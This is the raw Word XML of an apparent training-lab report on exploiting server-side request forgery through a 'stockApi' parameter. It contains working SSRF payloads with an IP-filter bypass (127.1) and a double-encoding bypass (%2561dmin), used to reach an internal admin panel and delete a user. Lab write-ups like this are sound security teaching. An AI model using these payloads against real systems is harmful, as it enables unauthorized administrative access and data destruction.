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9D35" w14:textId="77777777" w:rsidR="008F2E17" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>VAPT PoC Report: SSRF Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6AB526" w14:textId="77777777" w:rsidR="008F2E17" w:rsidRDefault="00000000">
      <w:r w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Login and open any product page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B443CD" w14:textId="442FCA2D" w:rsidR="008F2E17" w:rsidRDefault="00FB3317">
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="786BF84F" wp14:editId="52FD9AFC">
            <wp:extent cx="5486400" cy="2934335"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="12673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355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step 2:</w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t xml:space="preserve"> Click 'Check Stock' and intercept request in Burp Suite.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642AECF1" w14:textId="77777777" w:rsidR="00C83673" w:rsidRDefault="00C83673"/>
    <w:p w14:paraId="282017AA" w14:textId="09D2527F" w:rsidR="00C83673" w:rsidRDefault="00FB3317">
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64B38B4E" wp14:editId="19BFD03F">
            <wp:extent cx="5486400" cy="2933700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="6086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58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5BBD" w14:textId="77777777" w:rsidR="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D"/>
    <w:p w14:paraId="23608624" w14:textId="77777777" w:rsidR="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D"/>
    <w:p w14:paraId="3B99F6E0" w14:textId="3AE976CF" w:rsidR="008F2E17" w:rsidRDefault="00000000">
      <w:r w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Step 3:</w:t>
      </w:r>
      <w:r w:rsidR="0010355D" w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0010355D">
        <w:t xml:space="preserve">Send the request to the Repeater change the Stock Api value   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0010355D" w:rsidRPr="0010355D">
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0010355D" w:rsidRPr="0010355D">
        <w:t>=http://127.0.0.1/</w:t>
      </w:r>
      <w:r w:rsidR="0010355D">
        <w:t xml:space="preserve">   but it’s </w:t>
      </w:r>
      <w:r w:rsidR="0010355D" w:rsidRPr="0010355D">
        <w:t>Response: Blocked</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CA5C4E" w14:textId="06AD096B" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="00FB3317" w:rsidP="0010355D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4170F0AC" wp14:editId="3D2862BF">
            <wp:extent cx="5486400" cy="2797175"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="8149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7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55D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">step </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4:-</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0010355D" w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Bypass IP Filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C43FBF2" w14:textId="77777777" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:r w:rsidRPr="0010355D">
        <w:t>Change URL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47254410" w14:textId="77777777" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0010355D">
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0010355D">
        <w:t>=http://127.1/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38023757" w14:textId="7BB0E8C9" w:rsidR="00C83673" w:rsidRDefault="00FB3317" w:rsidP="0010355D">
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F741615" wp14:editId="3151F671">
            <wp:extent cx="5486400" cy="2854325"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="8663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0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571D" w14:textId="77777777" w:rsidR="00C83673" w:rsidRDefault="00C83673"/>
    <w:p w14:paraId="3463D1EE" w14:textId="77777777" w:rsidR="00C83673" w:rsidRDefault="00C83673"/>
    <w:p w14:paraId="4045118D" w14:textId="77777777" w:rsidR="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53AA1FB1" w14:textId="7F7ED883" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>5. Attempt Admin Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7C9213" w14:textId="449AEED7" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0010355D">
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0010355D">
        <w:t>=http://127.1/admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE4431E" w14:textId="5F50B262" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="00FB3317" w:rsidP="0010355D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F91CAB5" wp14:editId="4360CFC1">
            <wp:extent cx="5486400" cy="2872105"/>
            <wp:effectExtent l="0" t="0" r="0" b="4445"/>
            <wp:docPr id="9726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1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55D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Step </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>6:-</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0010355D" w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Bypass Keyword Filter (Double Encoding)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451A0921" w14:textId="2AD99662" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:r w:rsidRPr="0010355D">
        <w:t>admin → %61dmin → %2561dmin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DCFED9" w14:textId="77777777" w:rsidR="0010355D" w:rsidRPr="0010355D" w:rsidRDefault="0010355D" w:rsidP="0010355D">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0010355D">
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0010355D">
        <w:t>=http://127.1/%2561dmin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2059FEDE" w14:textId="432985BA" w:rsidR="008F2E17" w:rsidRDefault="008F2E17"/>
    <w:p w14:paraId="06B45E1D" w14:textId="2729574F" w:rsidR="00DF183C" w:rsidRDefault="00FB3317">
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7807398D" wp14:editId="601C229F">
            <wp:extent cx="5486400" cy="2961005"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3028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5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0C40" w14:textId="77777777" w:rsidR="00DF183C" w:rsidRDefault="00DF183C"/>
    <w:p w14:paraId="14791F6E" w14:textId="77777777" w:rsidR="00DF183C" w:rsidRDefault="00DF183C"/>
    <w:p w14:paraId="54DC3384" w14:textId="340FFEB8" w:rsidR="00440034" w:rsidRPr="00440034" w:rsidRDefault="00440034" w:rsidP="00440034">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step</w:t>
      </w:r>
      <w:r w:rsidR="00DF183C" w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Delete Target User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB12CD7" w14:textId="77777777" w:rsidR="00440034" w:rsidRPr="00440034" w:rsidRDefault="00440034" w:rsidP="00440034">
      <w:r w:rsidRPr="00440034">
        <w:t>Find delete endpoint:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E11FE70" w14:textId="77777777" w:rsidR="00440034" w:rsidRPr="00440034" w:rsidRDefault="00440034" w:rsidP="00440034">
      <w:r w:rsidRPr="00440034">
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00440034">
        <w:t>delete?username</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00440034">
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00440034">
        <w:t>carlos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3E95FC5C" w14:textId="635AC95B" w:rsidR="00DF183C" w:rsidRDefault="00FB3317">
      <w:r w:rsidRPr="00FB3317">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31A59434" wp14:editId="0B8C9EF0">
            <wp:extent cx="5486400" cy="2931795"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="207211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9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64A6" w14:textId="77777777" w:rsidR="0010355D" w:rsidRDefault="0010355D"/>
    <w:p w14:paraId="77F53F6A" w14:textId="1CA0B853" w:rsidR="00440034" w:rsidRDefault="00440034">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step 8:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Delete Target User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4B0D7F" w14:textId="7B75F998" w:rsidR="0010355D" w:rsidRPr="00440034" w:rsidRDefault="00440034">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00440034">
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00440034">
        <w:t>=http://127.1/%2561dmin/delete?username=carlos</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7070B286" w14:textId="66CEB9FA" w:rsidR="0010355D" w:rsidRDefault="0010355D">
      <w:r w:rsidRPr="0010355D">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="74EC1758" wp14:editId="550BF224">
            <wp:extent cx="5486400" cy="2936875"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="38692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5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B76A" w14:textId="77777777" w:rsidR="00440034" w:rsidRDefault="00440034"/>
    <w:p w14:paraId="54E755E2" w14:textId="0007B0E7" w:rsidR="0010355D" w:rsidRDefault="00440034">
      <w:r>
        <w:t xml:space="preserve">Step 9: - Lab solve successfully </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D307925" w14:textId="51FECBFF" w:rsidR="00DF183C" w:rsidRDefault="0010355D" w:rsidP="00DF183C">
      <w:r w:rsidRPr="0010355D">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="36E4CEE1" wp14:editId="76BA01FE">
            <wp:extent cx="5486400" cy="2948940"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="14707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0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7A452C9" w14:textId="1AFF34F5" w:rsidR="008F2E17" w:rsidRDefault="008F2E17"/>
    <w:sectPr w:rsidR="008F2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9DB1" w14:textId="77777777" w:rsidR="00ED1693" w:rsidRDefault="00ED1693" w:rsidP="0010355D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7C456F67" w14:textId="77777777" w:rsidR="00ED1693" w:rsidRDefault="00ED1693" w:rsidP="0010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A3359" w14:textId="77777777" w:rsidR="00ED1693" w:rsidRDefault="00ED1693" w:rsidP="0010355D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="0DCF472C" w14:textId="77777777" w:rsidR="00ED1693" w:rsidRDefault="00ED1693" w:rsidP="0010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01024"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DA0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F2106"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="122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17571">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="474685936">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1103263736">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="477037468">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1038311159">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1464889979">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="88161468">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="375664876">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="56562645">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="82533226">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1834684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55D"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00440034"/>
    <w:rsid w:val="00756751"/>
    <w:rsid w:val="008F2E17"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C83673"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00DD2AB5"/>
    <w:rsid w:val="00DF183C"/>
    <w:rsid w:val="00ED1693"/>
    <w:rsid w:val="00FB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DA94"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{05D21CD0-A0B9-449A-AEA5-7FEFE945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3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-30T06:07:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>